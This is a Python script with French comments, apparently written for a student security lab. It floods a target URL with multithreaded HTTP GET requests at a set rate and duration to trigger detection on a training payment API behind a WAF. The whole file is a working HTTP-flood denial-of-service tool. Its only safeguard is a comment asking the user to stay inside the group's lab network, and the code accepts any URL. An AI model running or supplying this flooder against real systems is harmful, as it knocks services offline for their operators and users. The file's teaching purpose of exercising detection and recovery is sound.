#!/usr/bin/env python3
"""
Script de déni de service CONTRÔLÉ — à lancer depuis la VM attaquante.

But : saturer l'API NovaPay de requêtes pour déclencher la détection, puis
observer la reprise. Reste STRICTEMENT dans le réseau du groupe : ne jamais
viser une autre cible que ta propre plateforme.

Usage :
    python3 attack_dos.py --url http://192.168.137.1 --rate 200 --duration 30

  --url       adresse de la plateforme (le WAF)
  --rate      requêtes par seconde (intensité) — commence raisonnable
  --duration  durée de l'attaque en secondes
  --path      chemin visé (par défaut la page d'accueil)

Arrête à tout moment avec Ctrl+C.
"""

import argparse
import threading
import time
import sys

try:
    import requests
except ImportError:
    sys.exit("Installe d'abord : pip install requests")


def worker(url, stop, counters):
    while not stop.is_set():
        try:
            r = requests.get(url, timeout=2)
            counters["ok" if r.status_code < 500 else "err"] += 1
        except Exception:
            counters["err"] += 1


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--url", required=True, help="Adresse de la plateforme, ex. http://192.168.137.1")
    p.add_argument("--rate", type=int, default=150, help="Requêtes/seconde visées")
    p.add_argument("--duration", type=int, default=30, help="Durée en secondes")
    p.add_argument("--path", default="/", help="Chemin visé")
    args = p.parse_args()

    target = args.url.rstrip("/") + args.path
    threads = min(max(args.rate // 10, 4), 100)  # nb de threads proportionnel à l'intensité
    stop = threading.Event()
    counters = {"ok": 0, "err": 0}

    print(f"[attaque] cible={target} intensité~{args.rate} req/s threads={threads} durée={args.duration}s")
    print("[attaque] Ctrl+C pour arrêter.\n")

    pool = [threading.Thread(target=worker, args=(target, stop, counters), daemon=True) for _ in range(threads)]
    for t in pool:
        t.start()

    start = time.time()
    try:
        while time.time() - start < args.duration:
            time.sleep(1)
            elapsed = time.time() - start
            total = counters["ok"] + counters["err"]
            print(f"  t={elapsed:4.0f}s  envoyées={total:6d}  ok={counters['ok']:6d}  erreurs/timeouts={counters['err']:6d}")
    except KeyboardInterrupt:
        print("\n[attaque] arrêt demandé.")
    finally:
        stop.set()
        time.sleep(0.5)

    total = counters["ok"] + counters["err"]
    print(f"\n[attaque] terminée. Total={total}  ok={counters['ok']}  erreurs/timeouts={counters['err']}")


if __name__ == "__main__":
    main()
